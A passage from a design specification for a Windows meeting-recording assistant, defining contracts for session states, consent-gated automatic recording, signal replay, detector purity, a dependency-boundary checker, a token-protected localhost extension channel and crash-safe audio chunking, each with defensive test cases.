**Verification.** `v-authz-foreign-sid-rejected` (T1): injected token comparison path.
`v-authz-dacl-shape` (T1): the constructed security descriptor is asserted to contain exactly the owner ACE.
`v-authz-pipe-squat` (T2): pre-created pipe causes engine exit and client refusal.
`v-authz-build-channel-carveout` (T1): a `release` client refuses an unsigned same-user server at a
non-installed path; a `development` client accepts a same-user server inside its own target directory and
refuses one outside it; and no runtime input flips either client's channel.

<!-- anchor: contract-session-state-machine -->
### contract-session-state-machine — declared states, declared transitions, explained causes

Owner: `component-session-model`. Dimension: `state_lifecycle`. Requirements: FR-010, FR-011, FR-012, FR-014,
FR-017, FR-027. Evidence mode: `total`. Observable scope: `global`.

**Rule.** States: `idle`, `candidate`, `arming`, `recording`, `paused`, `ending`, `finalizing`, `completed`,
`discarded`, `interrupted`, `failed`. The full transition set lives in `contracts/session/transitions.json` as
`(from, to, event, guard, effects)` tuples and is the single source of truth; `ma-session` exports its table
and a T0 check asserts code and file agree. `step(state, event, now) -> (state, effects)` is total: an event
with no declared transition returns `Rejected{state, event}` and leaves the state unchanged — it never
overwrites state silently. Every accepted transition is recorded with a `cause` of
`{kind: signal | command | timer | recovery, refs: [...]}` so any state can be explained from the record
alone, which is what PLAN Phase 5's "diagnostics explain the signals used for each decision" requires.
Commands are idempotent: `stop` in `finalizing`, `completed` or `discarded` returns success without effect.
Transitions are persisted (append to `session_transition`) before their effects are applied, so a crash
between intent and effect is recoverable and explainable.

**Operational inputs.** Suspend-excluding monotonic time (`information`, `single_value`, produced by
`component-capture-engine`'s clock reader, acquired per `step` call, required only for that call,
`immutable_value` within the call; it is an input rather than a read so the machine stays pure).

**Invariants.** No state is reachable except through a declared transition. Every `recording` session has
exactly one open track set and one session directory. `session_id` is stable across recovery.

**Durable footprint before `recording`.** This is the invariant that makes PLAN §7's "users can cancel
before automatic recording starts" observable on disk rather than only in the UI. In `candidate` and
`arming` the machine may create the `session` row and the meeting directory (`meetings/<meeting_id>/` with
an empty `chunks/`), because `contract-stable-identity` requires an identifier to be persisted before
anything references it — but **no audio sample may be written under the artifact root before the transition
into `recording`**. There is therefore no pre-roll buffer on disk: an implementation that keeps a rolling
pre-detection buffer may hold it only in memory and must discard it on any exit from `arming` other than
into `recording`. Consequences that follow and are tested: `ask` mode writes no audio byte at all until an
explicit `session.start` (FR-027); a cancelled or expired countdown leaves the meeting directory containing
zero chunk files, and the recovery path deletes the empty directory and the `session` row rather than
leaving a phantom meeting in the library (FR-028).

**Failure semantics.** Effects that fail (e.g. capture start fails) transition to `failed` with a typed cause
and never leave the machine in `arming`. A session found in `arming` at startup goes to `idle` — an armed
countdown is *not* resumed across a restart, because the user never saw the countdown they were supposed to be
able to cancel. A session found in `recording` at startup goes to `interrupted → finalizing`.

**Normal witness.** `idle --detector.start--> candidate --policy.auto--> arming --timer.elapsed--> recording
--detector.end--> ending --timer.elapsed--> finalizing --> completed`, with each hop carrying its cause.

**Adversarial witness** (risk tags: `concurrency`, `recovery`, `repeated_usage`). Given a session in
`finalizing`, when two clients both send `session.stop` and a detector `end` decision arrives in the same
millisecond, then the resulting state is `finalizing`/`completed` exactly once, exactly one finalization runs,
and both clients receive success — no `Rejected` is surfaced to the user for a redundant stop. Second case: a
crash occurring while `arming`, restart, and the meeting is still in progress: the machine must be in `idle`
and may only re-arm after a *fresh* detector decision with a fresh countdown.

**Verification.** `v-session-table-conformance` (T0): exported table equals `transitions.json`.
`v-session-exhaustive-step` (T1): every (state, event) pair returns either a declared transition or `Rejected`.
`v-session-idempotent-commands` (T1). `v-session-crash-in-arming` (T1): recovery lands in `idle`.

<!-- anchor: contract-recording-mode-policy -->
### contract-recording-mode-policy — auto / ask / manual, countdown, hysteresis

Owner: `component-session-model`. Dimension: `control_flow`. Requirements: FR-010, FR-012, FR-028,
NFR-005. Evidence mode: `total`. Observable scope: `local`.

**Rule.** Mode resolution order: per-application override → application class default (desktop = `auto`,
browser = `ask`) → global setting. `auto`: a determinate start decision arms a 10-second countdown that is
cancellable from the notification and from the UI; `ask`: no countdown and no capture until the user says
start — the notification raised on detection carries a **Start** action, and an attached client may equally
send `session.start`; `manual`: no detection notification at all, though detection still runs for diagnostics.

**Where `ask` mode's Start lives.** The same engine-owned notification that carries Cancel in `auto` mode
carries Start in `ask` mode, so `ask` does not require an attached client. Stating this is not decoration: the
application-class default makes *browser* meetings `ask`, and assumption (4) says the normal state of the UI
is closed or in the tray, so an `ask` mode whose only Start affordance lived in a client would silently make
browser meetings unrecordable in the ordinary case — the same inversion that
`contract-consent-surface-precondition` rejects for `auto`. If no consent surface of either kind can present
the prompt, `ask` fails closed exactly as `auto` does, with a `suppressed{no_consent_surface}` record.
Cancellation semantics: cancelling an armed countdown moves the session to `discarded{user_cancelled}` and
**suppresses re-arming for the same meeting identity** (`adapter_id` + `subject_key`) until that identity's
signals have been continuously absent for **60 seconds** — otherwise the next detector tick re-arms
immediately and the product nags the user every ten seconds. Sixty seconds is the same predicate as the end
hysteresis below, deliberately: "this meeting is over" is one definition, used in both places, so a user who
cancels is not asked again for the life of that meeting and *is* asked again for the next one. End: a
determinate end decision moves the session to `ending` and holds for **60 seconds**; a continuing signal
within the window returns the session to `recording` on the same tracks, with the timeline continuous and no
new files. At expiry a "still in the meeting?" prompt is raised on the consent surface and stays answerable
for **30 seconds**; answering yes grants **one** extension of **300 seconds** per `ending` episode, after
which the next expiry finalizes without a further prompt; no answer within the 30-second prompt window
finalizes.

**Clock rule.** All deadlines are evaluated against a clock that excludes system suspend
(`QueryUnbiasedInterruptTime`-shaped). On a `system_resume` signal, every pending deadline is recomputed and
every pending `arming` decision is re-evaluated against current signals instead of firing — a laptop closed
during a countdown must not wake up recording.

**Operational inputs.** (1) Per-application mode overrides and global mode (`information`, `single_value`,
produced by `component-store`, acquired at session evaluation, required until the decision resolves,
`snapshot` — a mode change during an armed countdown does not retroactively change that countdown; it applies
to the next decision, which is stated so the implementer does not invent a race). (2) Suspend-excluding
monotonic time, as above.

**Invariants.** No capture ever begins without either an explicit command or an elapsed, visible,
cancellable countdown. Hysteresis never produces a second session for one continuous meeting. Every bound in
this contract is a fixed number (10 s countdown, 60 s cancel quiet period, 60 s end hysteresis, 30 s prompt
window, one 300 s extension) — a bound written as "declared" without a value cannot be falsified, so none
appears here.

**Failure semantics.** If the mode store is unreadable, the effective mode is `manual` (fail to the least
surprising behaviour), and the degradation is surfaced.

**Normal witness.** Teams desktop start detected in `auto`: notification with a visible 10 s countdown; no
cancel; capture starts; timeline origin equals the countdown expiry, not the detection instant.

**Adversarial witness** (risk tags: `stale`, `boundary`, `repeated_usage`). Given `auto` mode and an armed
countdown at t=3 s, when the machine suspends for 30 minutes and resumes, then the system must not start
capture on resume; it must re-evaluate and, if the meeting is still live, arm a *new* full countdown. Second
case: an end signal that flaps (microphone released and reacquired every 5 s for two minutes) must produce
exactly one `recording → ending → recording` pair per genuine gap and must not create additional sessions or
finalize mid-meeting.

**Verification.** `v-mode-resolution-order` (T1): the resolution order above, and — in the same test — that a
detection resolved to `ask` returns a notify effect whose action set carries `start`, so `ask` is satisfiable
with no client attached. `v-mode-countdown-cancel-suppression` (T1).
`v-mode-suspend-resume-reevaluation` (T1): fixture with a `system_suspend`/`system_resume` pair.
`v-mode-hysteresis-flap` (T1): flapping fixture yields one session.

<!-- anchor: contract-consent-surface-precondition -->
### contract-consent-surface-precondition — automatic capture requires a live indicator and a live cancel

Owner: `component-session-model`. Dimension: `user_observability`. Requirements: FR-011, FR-004, FR-027,
FR-028. Evidence mode: `fallible`. Observable scope: `global`.

**Rule.** A **consent surface** is any channel that can, at the moment of the decision, (a) show the user
that a recording is about to start or is being offered and (b) accept the user's decision — a cancel in
`auto` mode, a start in `ask` mode — before capture begins. Two kinds exist and the engine prefers the first:

| Kind | Provided by | Available when |
| --- | --- | --- |
| engine notification | `ma-engine.exe` itself, through the Windows notification platform under the application's package identity | the notification platform accepts the toast and reports it as delivered |
| attached client | a UI or tray client that completed the handshake declaring capabilities `indicator` and `cancel` | the client's connection is live |

An automatic start requires **at least one** of them. The engine notification is the primary one, and it is
what makes automatic recording work in the case the separate engine process exists for: the UI is closed,
nothing is attached, a meeting starts, and the user still sees a ten-second countdown they can cancel from
the toast. Requiring an attached client would have inverted PLAN §2's automatic recording in exactly that
case, so the rule does not require one. **No mode requires an attached client.** Mode `ask` starts capture
only on an explicit user start, but that start is an activation of the engine's own notification just as
cancel is (`session.start` from an attached client is the equivalent second path, not the only one) — which
matters because the browser application class defaults to `ask` and assumption (4) says the UI is normally
closed. Mode `manual` raises nothing at all and therefore needs no surface.

If **neither** surface is available — the notification platform refuses or reports non-delivery (Focus
Assist suppression, Do Not Disturb, notification permission revoked, package identity unavailable) *and* no
client is attached — a determinate start decision is recorded as `suppressed{no_consent_surface}` and **no
capture begins** (FR-011). This is the residual fail-closed case, not the common one: PLAN §7's "recording
is always visibly indicated" is not satisfiable by a recording nobody can see, so not recording is the
correct outcome, and the suppression is surfaced in the library as "meeting detected, not recorded (no way
to show you)" rather than being silent.

Symmetrically, if every consent surface disappears while a session is already `recording`, capture continues
— stopping would violate FR-004 — and the engine records `indicator_unavailable` on the session timeline,
re-asserts the indicator when any surface returns, and relies in the interim on the platform microphone
indicator. The asymmetry is deliberate and is what makes the rule non-trivial: *starting* unobserved is
forbidden, *continuing* unobserved is required.

**Decision path with no client.** Cancelling (in `auto`) or starting (in `ask`) from the toast is an
activation of the notification, which the engine receives through its own notification activation callback —
no client process participates. A cancel that arrives after the countdown expired is answered with "already
recording" and offers stop, rather than being silently dropped; an `ask` start that arrives after the meeting
identity's signals have gone is answered with "that meeting has ended" rather than opening a session with no
audio to capture.

**Operational inputs.** (1) Notification delivery capability (`authority`, producer external — the Windows
notification platform — acquired per decision by attempting delivery and reading the delivery result,
required until the countdown resolves, `current_lookup`; it is looked up per decision rather than cached
because Focus Assist state changes without notice; unavailable → this surface does not count and the rule
falls through to the client kind). (2) Attached-client set with declared capabilities (`information`,
`single_value`, producer `component-ipc-contract`, acquired at handshake, required until decision
resolution, `current_lookup` — a client can appear or vanish between detection and arming; if the last
surface of *both* kinds vanishes mid-countdown the countdown is cancelled with cause
`consent_surface_lost` and, per `contract-session-state-machine`, no audio byte exists to discard).

**Invariants.** Every session whose capture began automatically had at least one consent surface at arming
and at countdown expiry. No session that began automatically without one exists. A suppressed decision is
always recorded with its cause — suppression is never silent.

**Failure semantics.** Suppression is not an error: it is a recorded decision, visible in diagnostics and in
the meeting library, so the user can understand the gap. A notification that is accepted but then fails to
render (a platform bug) is indistinguishable from a delivered one at the API surface; that residual is
recorded in the threat model as accepted, because the alternative — refusing to record whenever delivery
cannot be *proved* — would suppress recording on every machine with an aggressive notification policy.

**Normal witness.** Given mode `auto` and **no client process running at all**, when a meeting is detected,
then a countdown notification is delivered by the engine, and at expiry capture begins and chunk files
appear. This is the witness that would have failed under a rule requiring an attached client.

**Adversarial witness** (risk tags: `boundary`, `recovery`, `unsupported_environment`). Given no client is
attached and the notification platform is configured to reject delivery, when a meeting is detected in
`auto` mode, then no chunk file is ever created and a `suppressed{no_consent_surface}` record exists.
Contrast case in the same test file: given a session already `recording`, when the last client is killed and
notification delivery then starts failing, then chunks continue and `indicator_unavailable` is recorded. The
two cases together are what make the rule non-trivial, and an implementation that satisfies only one fails.
Third case: given an armed countdown and no client, when the user activates cancel on the toast, then the
session moves to `discarded{user_cancelled}` and the artifact root contains zero audio bytes for it.

**Verification.** `v-consent-engine-notification-starts-without-client` (T2): no client process, auto
detection, countdown notification delivered, capture starts.
`v-consent-no-surface-no-start` (T2): notification delivery refused and no client ⇒ no chunk file and a
recorded suppression. `v-consent-surface-loss-keeps-recording` (T2).
`v-consent-cancel-leaves-no-audio-byte` (T2): cancel during the countdown leaves zero bytes of audio under
the artifact root for that session (FR-028).

<!-- anchor: contract-signal-envelope -->
### contract-signal-envelope — what a signal is, and how timelines replay

Owner: `component-signal-contract`. Dimension: `data_model`. Requirements: FR-007, NFR-005. Evidence mode:
`total`. Observable scope: `local`.

**Rule.** A signal is `{signal_id (UUIDv7), source_id, kind, subject, observed_at {monotonic_ns, wall_utc},
payload, authority, schema_version}`. `kind` is a closed enum:
`process_started`, `process_stopped`, `package_identity_observed`, `audio_session_created`,
`audio_session_destroyed`, `mic_capture_started`, `mic_capture_stopped`, `audio_activity`,
`tab_meeting_present`, `tab_audible`, `calendar_event_active`, `user_command`, `system_suspend`,
`system_resume`, `collector_started`. `subject` is a closed union: `process{pid, image_path,
package_family_name}`, `device{endpoint_id}`, `tab{host, tab_key}`, `system`. `authority` is `os` |
`extension` | `user` | `calendar`. There is **no free-text UI field** anywhere in the envelope: no window
title, no control label, no coordinate, no accessibility path, no full URL. That is what makes PLAN §3's
"detection must not depend on DOM structure…" a structural property rather than a promise — a DOM-derived
fact has nowhere to live.

**Resync rule.** A collector that starts (or restarts) while a condition is already true emits the current
state with `payload.restart_resync = true`. The detector may raise a `candidate` from a resync signal but may
never produce a determinate *start* from one, because the user was not present at the true beginning and the
consent countdown would be meaningless.

**Ordering.** Per source, signals are ordered by `monotonic_ns`; the detector merges sources on monotonic
time. `wall_utc` is recorded for human display and correlation only and is never used for ordering, so an NTP
step or a timezone change cannot reorder a timeline. Duplicate `signal_id` is idempotent.

**Fixture format.** `fixtures/signal-timelines/<name>.jsonl`: a header record
(`{schema_version, adapter_table_version, machine_profile (redacted), created}`) followed by one signal per
line. Labels ("was this a meeting?") live in a sidecar `<name>.labels.json` keyed by time range, so labels can
be added later without rewriting or re-signing the timeline. The header exists so that a later envelope change
is survivable: a recorded timeline must stay replayable either through a tested upgrade function or by keeping
the pinned old decoder, never by silently dropping fields. Phase 0 records the header and the rule but writes
no upgrade function, because Phase 0 has no recorded corpus to upgrade — the obligation attaches to Phase 1,
which is where the fixtures and the first envelope revision both appear.

JSONL rather than an embedded SQLite file, decided here rather than left open: these fixtures are reviewed in
pull requests and appended to during live capture, and both of those work on a line-oriented text file and
fight a binary one. Phase 5's large regression matrix needs an *index*, not a different on-disk truth — it can
load JSONL into SQLite at analysis time and rebuild that index at will, whereas a SQLite fixture that has
become the truth cannot be diffed in review ever again. Recorded in
`adr-20260903-detector-signal-replay-contract`.

**Operational inputs.** None beyond the collectors themselves. `input_closure_reason`: the envelope is a pure
data contract; the acquisition of the underlying OS facts is owned by the collectors and appears as operational
inputs on `contract-detector-outcome-partition` and `contract-extension-channel-trust`.

**Invariants.** A recorded timeline plus the adapter table version is sufficient to reproduce detection; no
detection input exists outside the timeline.

**Failure semantics.** A signal failing schema validation at ingestion is dropped with a counter and a typed
diagnostic naming `kind` and `source_id` only; it never crashes the pipeline and never enters the timeline.

**Normal witness.** A Teams start sequence — `process_started`, `package_identity_observed`,
`audio_session_created`, `mic_capture_started` — round-trips through JSONL and back to identical structs.

**Adversarial witness** (risk tags: `stale`, `malformed`, `partial_data`). Given the application starts while a
Zoom meeting is already in progress, when the collector emits `mic_capture_started{restart_resync: true}`, then
the detector must produce at most a `candidate` and the session must not auto-arm. Second case: a timeline
whose `wall_utc` jumps backwards by an hour mid-stream (DST or NTP) must replay to the identical decision
sequence as one without the jump, because ordering uses `monotonic_ns`.

**Verification.** `v-signal-schema-conformance` (T0): Rust ↔ JSON Schema golden round-trip.
`v-signal-no-ui-text-fields` (T0): the schema is asserted to contain no free-text subject field.
`v-signal-resync-no-autostart` (T1). `v-signal-wall-clock-jump` (T1).

<!-- anchor: contract-detector-determinism -->
### contract-detector-determinism — the detector is a pure, replayable function

Owner: `component-detector-core`. Dimension: `control_flow`. Requirements: FR-007, NFR-005, NFR-008. Evidence
mode: `total`. Observable scope: `local`.

**Rule.** `decide(&SignalTimeline, &DetectorConfig, &AdapterTable) -> Vec<Decision>` is pure: no clock read,
no filesystem, no network, no randomness, and no dependence on hash iteration order (ordered collections or
explicit sorts only). Time enters as `observed_at` on signals. Every `Decision` carries `{decision_id,
outcome, adapter_id, rule_id, evidence: [signal_id], produced_at_monotonic}`. Replaying a fixture with the same
config and adapter-table version produces byte-identical serialized decisions across runs, machines and
process restarts.

**Enforcement.** Purity is not left to review: `boundary.toml` declares `ma-detect`'s forbidden imports
(`std::time`, `std::fs`, `std::net`, `std::process`, `rand`, `std::collections::HashMap` iteration in decision
paths) and the boundary check fails on any of them. This makes an abstract property mechanically decidable,
which is why it is worth stating at all.

**Operational inputs.** Adapter table version (`versioned_state`, producer `component-service-adapters`,
acquired at composition-root construction, required for the whole replay, `version_bound`; a fixture recorded
under a different adapter-table version replays only against a pinned table, and the replay harness fails
loudly on mismatch rather than comparing decisions across incomparable tables).

**Invariants.** Same inputs ⇒ same outputs, byte for byte. Every decision names the signals it used.

**Failure semantics.** A decision that cannot cite evidence is a programming error and panics in debug /
returns `Rejected` in release; there is no "decision from nowhere".

**Normal witness.** A recorded Teams timeline replayed twice in one process and once in a fresh process
produces three identical decision JSON documents.

**Adversarial witness** (risk tags: `concurrency`, `stale`, `unknown`). Given an adapter table with four
adapters where two match the same process subject, when the timeline is replayed 100 times, then the decision
order and content must be identical every time — an implementation iterating a `HashMap` over adapters passes
casually and fails this test. Second case: a `SystemTime::now()` introduced into a guard must fail
`v-detect-purity-lint` at T0 before any test runs.

**Verification.** `v-detect-purity-lint` (T0): forbidden-import check for `ma-detect`.
`v-detect-replay-determinism` (T1): N-run byte equality, plus a fresh-process run.
`v-detect-evidence-present` (T1): every decision cites at least one signal id.

<!-- anchor: contract-detector-outcome-partition -->
### contract-detector-outcome-partition — determinate, unknown, inconclusive, conflicting

Owner: `component-detector-core`. Dimension: `control_flow`. Requirements: FR-008, FR-009, NFR-005. Evidence
mode: `multi_source`. Observable scope: `local`.

**Rule.** Every detector evaluation lands in exactly one outcome:

| Outcome | Condition | Policy |
| --- | --- | --- |
| `determinate{start\|continue\|end}` | an adapter matched the subject and its declared evidence requirement is met | drives the session machine |
| `unknown` | no adapter matched the observed subject | generic fallback: manual control only; no notification unless generic detection is explicitly enabled |
| `inconclusive` | an adapter matched but required corroboration is absent (e.g. `tab_meeting_present` with no `mic_capture_started` from the same browser process tree) | session may enter `candidate`; never arms |
| `conflicting` | two or more adapters report concurrently active meetings | at most one active session by declared precedence (evidence weight, then earliest start); losers recorded as `suppressed_candidate{reason}` and visible in diagnostics |

Coverage and exclusivity basis: the outcome is computed by a total match over the tuple
`(adapter_matched?, corroboration_met?, competing_active?)`, so every input lands in exactly one arm and the
compiler enforces exhaustiveness. Default policy: **the absence of a determinate outcome never starts
capture.** An unknown *version* of a matched application is not `unknown` — package identity is sufficient for
start detection, and version only selects optional per-version behaviour — which is exactly PLAN Phase 5's
"unknown versions use the configured safe fallback".

**Operational inputs.** (1) Microphone-use facts (`information`, `stream`, producer
`component-signal-contract` via the Windows collectors, acquired continuously, required until the decision,
`current_lookup`; unavailable → corroboration cannot be met → `inconclusive`, never an optimistic start).
(2) Extension tab facts (`information`, `stream`, producer external — the browser extension — via
`component-extension-channel`, acquired continuously, `current_lookup`, `authority: extension`; unavailable →
browser meetings degrade to manual).

**Invariants.** No outcome outside the four. Extension-authority evidence alone never yields
`determinate{start}`.

**Failure semantics.** A panicking or erroring adapter is treated as "did not match", is disabled for the
remainder of the process with a diagnostic, and never takes the pipeline down (PLAN Phase 5: "adapter failure
falls back safely").

**Normal witness.** Meet tab present + Chrome microphone capture started → `determinate{start}` citing both
signal ids.

**Adversarial witness** (risk tags: `conflicting_evidence`, `inconclusive`, `unknown`, `partial_data`). Given
a Teams meeting and a Zoom meeting both with active microphone capture in overlapping windows, when the
detector evaluates, then exactly one session becomes active and the other is recorded as
`suppressed_candidate` with a reason — not two concurrent recordings, and not a silently dropped meeting.
Second case: a Meet tab reporting `tab_meeting_present` and `tab_audible` with **no** microphone signal
(a user watching a recorded meeting) must be `inconclusive` and must never arm.

**Verification.** `v-detect-partition-exhaustive` (T1): property test over the tuple space.
`v-detect-conflict-precedence` (T1). `v-detect-extension-alone-inconclusive` (T1).
`v-detect-adapter-panic-isolated` (T1).

**Semantic profile.** `outcome_partition` — triggered because the decision is fallible and multi-source
(OS signals plus a non-authoritative external producer). Evidence required at integration: the outcome table
above with its coverage/exclusivity basis, and a named failure outcome for each unavailable input.

<!-- anchor: contract-module-boundary-enforcement -->
### contract-module-boundary-enforcement — the leak-proof rule and its non-vacuous check

Owner: `component-boundary-check`. Dimension: `integration_contract`. Requirements: FR-001, FR-002, FR-003,
NFR-008. Evidence mode: `total`. Observable scope: `global`.

**Rule.** `boundary.toml` declares: layer membership per crate; allowed edges (a crate may depend only on
strictly lower layers); sink crates (L4 adapters/processors/destinations — nothing but L5 composition roots
may depend on them); forbidden imports per crate (`ma-detect`: `std::time`, `std::fs`, `std::net`,
`std::process`, `rand`); and two *separately declared* forbidden-literal classes with an explicit allowlist
for L4 crates, their tests and fixtures. `cargo xtask boundary` resolves the graph from
`cargo metadata --all-features` (so a feature-gated dependency cannot hide a leak), checks **transitive**
edges (so `core → helper → ma-adapter-teams` is caught), scans sources for forbidden imports and literals,
and exits non-zero listing every violation with crate/file/line. `cargo deny check` covers advisories,
licenses and third-party bans. Both run in CI on every push and pull request.

**Scan surface** — declared, because two checkers that both pass the fixture set can otherwise disagree on
real source. The scanner parses each file into tokens and classifies every match by the token kind it was
found in. **Comments and doc comments are never scanned by either class.**

| Class | Token kind scanned | Match rule | Word / literal set |
| --- | --- | --- | --- |
| A — service identifiers | identifier tokens only (crate names, module and import path segments, item names, bindings) | the identifier is split on `_` and on CamelCase boundaries and each resulting word is compared case-insensitively for equality | `teams`, `slack`, `zoom`, `webex`, `msedge`, `gmeet`, `googlemeet` |
| B — process, package and host literals | string literals only | whole-literal case-insensitive equality against the declared table | `"Teams.exe"`, `"ms-teams.exe"`, `"MSTeams_8wekyb3d8bbwe"`, `"Zoom.exe"`, `"slack.exe"`, `"chrome.exe"`, `"msedge.exe"`, `"teams.microsoft.com"`, `"meet.google.com"`, `"zoom.us"` (extended only by editing `boundary.toml`) |

`meet`, `edge` and `chrome` are deliberately **absent** from class A. They are ordinary words in ordinary
code — "the corroboration requirement this adapter must meet", `graph_edge`, `chrome_free` — and a checker
that fails on them generates false positives whose only relief is widening the allowlist, which is how a
gate like this stops meaning anything. Those vendors are caught by class B instead, where a whole-literal
match cannot fire on prose or on graph terminology. Substring matching is forbidden in both classes.

**Vacuity guard.** `xtask/tests/boundary_negative.rs` runs the checker against
`xtask/tests/fixtures/violating-workspace/`, which deliberately contains three violations and three decoys.
Violations: (a) a workflow-layer crate depending on an adapter crate, (b) a `"Teams.exe"` literal in a core
crate, (c) a `std::time` import in a detector-shaped crate. Decoys, which must **not** be reported: (d) a doc
comment reading "the corroboration requirement this adapter must meet", (e) a binding named `graph_edge` and
a function named `edge_weight`, (f) a string literal `"meeting ended"`. The test asserts a non-zero exit and
exactly the three violation ids — no more and no fewer. Without the violations, the entire exit criterion
could be satisfied by a checker that always prints "OK"; without the decoys, it could be satisfied by a
checker that greps raw bytes and fails on English, which is worse than useless because the pressure it
creates is to widen the allowlist.

**Operational inputs.** Cargo metadata for the workspace (`versioned_state`, producer external — the cargo
toolchain — acquired per check run, required for that run, `current_lookup`; a metadata failure is a check
failure, never a pass).

**Invariants.** Adapter crates are graph sinks. Core crates contain no service identifier. The check's own
detection power *and* its precision are both tested — the fixture asserts an exact violation set, so a
false positive fails the build as loudly as a false negative.

**Failure semantics.** Violations are reported as a complete list (not first-failure) so a contributor fixes
them in one pass; the exit code is non-zero; CI blocks merge.

**Normal witness.** A clean workspace: `cargo xtask boundary` exits 0 and prints the checked edge count.

**Adversarial witness** (risk tags: `boundary`, `unsupported_environment`, `repeated_usage`). Given
`ma-workflow` gains `ma-adapter-zoom` as an **optional, feature-gated** dependency, when the check runs, then
it must fail — a check that resolves default features only would pass. Given `ma-detect` gains a transitive
path to `ma-adapter-meet` through a new helper crate, the check must fail naming the path, not only direct
edges.

**Verification.** `v-boundary-clean-workspace` (T0). `v-boundary-negative-fixture` (T1): the vacuity guard.
`v-boundary-feature-gated-leak` (T1). `v-boundary-ci-gate` (T0): CI workflow asserted to invoke both checks.

<!-- anchor: contract-extension-channel-trust -->
### contract-extension-channel-trust — a localhost channel that a web page cannot use

Owner: `component-extension-channel`. Dimension: `security_boundary`. Requirements: FR-009, NFR-001, NFR-005.
Evidence mode: `fallible`. Observable scope: `global`.

**Rule.** The transport is a loopback listener, not Chrome native messaging; the alternative and the
condition that would flip it are recorded below and in
`adr-20260903-extension-localhost-channel-trust`. The engine binds `127.0.0.1` on an ephemeral port with
`SO_EXCLUSIVEADDRUSE` and writes
`%LOCALAPPDATA%\MeetingAssistant\ext\endpoint.json` (`{port, token}`, 256-bit random token) with a DACL
granting only the current user. Every request must present the token *and* an `Origin` of
`chrome-extension://<pinned extension id>`; any request whose `Origin` is `http://` or `https://`, or whose
token is absent or wrong, is rejected with no body and counted. Messages carry a per-instance monotonically
increasing `seq` and a **5-second freshness window** measured on the engine's monotonic clock; a message whose
`seq` is not greater than the last accepted one, or whose stated observation time is more than 5 s old, is
dropped. The channel accepts at most **20 messages per second per connection** and at most **200 queued
messages** before it drops oldest-first and raises a counter — an extension that floods must degrade browser
detection, never the engine. Accepted messages
become signals with `authority: extension`, carrying only `{host, tab_key, audible, meeting_present}` — never
a full URL, never a page title.

**Non-authoritativeness.** An extension signal can raise `candidate` and can contribute to an `end` decision,
but a `determinate{start}` additionally requires an `os`-authority `mic_capture_started` whose subject process
belongs to the same browser process tree. This is both the security property (a forged tab signal cannot cause
a recording) and the robustness property PLAN §4 already asks for.

**Operational inputs.** (1) Endpoint token (`authority`, producer `component-extension-channel`, acquired at
engine start by generation, required until engine exit, `capability_bound`, rotated on every engine start so a
leaked token dies with the process; unavailable → channel disabled). (2) Pinned extension id
(`information`, `single_value`, producer external — the published extension — acquired from the signed adapter
manifest, `version_bound`; on mismatch the connection is refused rather than trusted).

**Invariants.** No process that cannot read the user's `%LOCALAPPDATA%` can inject a signal. No extension
signal alone starts a recording.

**Failure semantics.** Token file unwritable, port unavailable, or extension absent → channel disabled,
browser meetings fall back to manual, a diagnostic is recorded; never a crash and never an open
unauthenticated port. Backlog overflow drops messages and records the count; it never blocks the listener
thread and never grows without bound.

**Normal witness.** The extension posts `{meeting_present: true, host: "meet.google.com", audible: true}` with
a valid token and origin; a signal appears with `authority: extension`; combined with Chrome microphone use, a
`determinate{start}` follows.

**Adversarial witness** (risk tags: `boundary`, `malformed`, `repeated_usage`, `stale`). Given a hostile web
page executing `fetch("http://127.0.0.1:<port>/signal", {...})` after brute-forcing the port, when the request
arrives without the token (a page cannot read `%LOCALAPPDATA%`) or with a browser `Origin`, then it is
rejected and no signal is created. Second case: a local process that *can* read the token replays a captured
`meeting_present` message; the freshness window and `seq` reject it, and even if accepted it cannot start a
recording without a corroborating OS microphone signal — the test asserts the recording does not start.

**Verification.** `v-ext-token-required` (T1). `v-ext-origin-rejects-web` (T1). `v-ext-replay-rejected` (T1).
`v-ext-alone-cannot-start` (T1): forged extension signal + no mic signal ⇒ no capture.

**Rejected alternative, and the condition that would reverse it.** Chrome/Edge **native messaging** is
materially stronger on the security axis: the browser launches the host process over stdio and authenticates
by extension id from a registry-registered manifest, which eliminates the listening port, the token file and
the entire hostile-web-page attack surface. It is not taken for Phase 0 because it costs a host process per
browser, per-browser registry registration inside the installer, and a forwarding hop into the engine — and
because the residual risk it removes is already bounded to near nothing by two rules this contract fixes
independently: the token lives in a user-only-DACL file that a web page cannot read, and an extension-
authority signal can never alone start a recording. The worst outcome of a fully compromised loopback
channel is therefore a spurious `candidate`, not a recording.

The named condition that reverses this decision, recorded so it is checked rather than remembered: if Phase 1
finds that the token file is readable by a same-user process the extension trust model must exclude (a
browser sandbox escape class, or a per-app-container identity that shares the user SID), or if Chrome or Edge
restricts extension `fetch` to loopback in a way that forces a workaround, the transport moves to native
messaging and this contract's authentication rules are replaced wholesale by the host manifest's
`allowed_origins`. The message schema, the non-authoritativeness rule and every verification except
`v-ext-token-required` and `v-ext-origin-rejects-web` survive that move unchanged, which is why the choice is
reversible at bounded cost and is therefore taken now rather than deferred.

<!-- anchor: contract-chunk-durability -->
### contract-chunk-durability — bounded audio loss and honest recovery

Owner: `component-capture-engine`. Dimension: `failure_recovery`. Requirements: FR-013, FR-014, NFR-003.
Evidence mode: `total`. Observable scope: `global`.

**Rule.** Per track, samples accumulate into chunks of exactly 30 s (480 000 samples at 16 kHz mono s16le)
except the final one. A chunk becomes durable in this order: write to
`<root>/meetings/<meeting_id>/chunks/<track>/<seq:06>.wav.part` → flush and `FlushFileBuffers` → rename to
`<seq:06>.wav` → append a manifest record → fsync the manifest. Because the rename is the durability point,
**at most one in-progress chunk (≤30 s) of audio can be lost on abrupt termination**, and that is the bound
the contract states and tests.

**Recovery.** The chunk *directory* is the truth and the manifest is a cache. On restart: every `<seq>.wav`
present is adopted; a manifest record naming an absent file becomes an explicit gap; a `<seq>.wav.part` is
repaired if it contains at least one complete frame (rewrite the WAV header to the actual data length, rename
in) and otherwise deleted and represented as a gap. Recovery never silently renumbers: sequence numbers are
stable, and a missing `<seq>` in the middle of a run is a gap, not a shift.

**Capture-path isolation.** The chunk writer must never block on the database, on IPC or on the network. Disk
stalls are absorbed by a bounded in-memory queue of **60 s per track** (two whole chunks, 1 920 000 bytes
at 16 kHz mono s16le); on overflow the writer
drops samples, records an explicit gap and emits `capture.degraded{disk_backpressure}` — it must not stall the
audio callback and must not grow memory without bound. Choosing "lose bounded audio loudly" over "stall the
capture thread" is deliberate: a stalled callback loses audio too, but silently and unboundedly.

**Operational inputs.** Artifact root availability (`versioned_state`, producer external — the filesystem —
acquired at session start, required until finalization, `current_lookup`; the root becoming unavailable
mid-session, e.g. an unplugged external drive, is not recoverable by retry: the session transitions to
